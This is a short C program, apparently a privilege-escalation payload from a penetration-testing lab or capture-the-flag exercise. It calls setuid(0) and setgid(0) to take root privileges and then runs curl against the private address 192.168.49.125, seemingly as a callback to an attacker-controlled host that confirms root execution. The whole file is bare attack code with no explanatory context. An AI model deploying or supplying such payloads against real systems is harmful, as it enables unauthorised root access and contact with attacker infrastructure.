#include<stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
  setuid(0);
  setgid(0);
	system("curl http://192.168.49.125");	
	return 0;
}